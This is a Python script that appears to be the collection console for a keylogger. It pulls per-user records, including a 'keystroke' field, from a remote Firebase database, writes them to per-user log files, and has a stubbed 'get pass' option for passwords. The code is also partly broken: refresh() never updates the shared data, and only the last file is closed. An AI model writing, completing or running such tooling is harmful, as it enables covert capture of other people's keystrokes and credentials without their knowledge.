from firebase import firebase
import requests

firebase = firebase.FirebaseApplication('https://testunessayproject.firebaseio.com/', None)
result = firebase.get('person', None)


def getAll():
	
	for x in result:
		f = result[x]['user'] + "_Log.txt"
		file = open(f, "w", encoding="utf-8")
		for i in result[x]:
			
			if i=="keystroke":
				file.write(i+":\n")
				keys = result[x][i].split("~")
				for j in keys:
					file.write(j + "\n")
			else:
				aList = result[x][i].split('~')
				temp = []
				for j in  aList:
					if j != '':
						temp.append(j)
				aList = temp
				file.write(i +':\n' +str(aList) +"\n")
		file.write("\n")
	file.close()
	print('Done\n')

def refresh():
	result = firebase.get('person', None)
	print('Refresh Done\n')

def getUser():
	refresh()
	
	for x in result:
		name = result[x]['user']
		print(name)
	print('done')
	

def getByName():
	refresh()
	
	i=0
	for x in result:
		name = result[x]['user']
		print( f'{i} : {name}')
		i += 1
	
	num = int(input('choose the number: '))

	i = 0
	for x in result:
		name = result[x]['user']
		if i == num:
			f = result[x]['user']+"_Log.txt"
			file = open(f, "w", encoding="utf-8")
			for y in result[x]:
				file.write(y+":\n")
				if y=="keystroke":
					keys = result[x][y].split("~")
					for j in keys:
						file.write(j + "\n")
				else:
					file.write(result[x][y]+"\n")
			file.write("\n")
		i += 1
	print('Done\n')

def getPass():
	pass

if __name__=='__main__':
	while True:
	
		i = input("0 to get log from all user \n1 to get name of all users \n2 to choose a user for a log file \n3 to get pass\n4 to stop\nEnter: ")
		if i == '0':
			getAll()
		if i == '1':
			getUser()
		if i == '2':
			getByName()
		if i == '3':
			getPass()
		if i=='4':
			break
		if "01234".find(i) == -1:
			print('wrong')

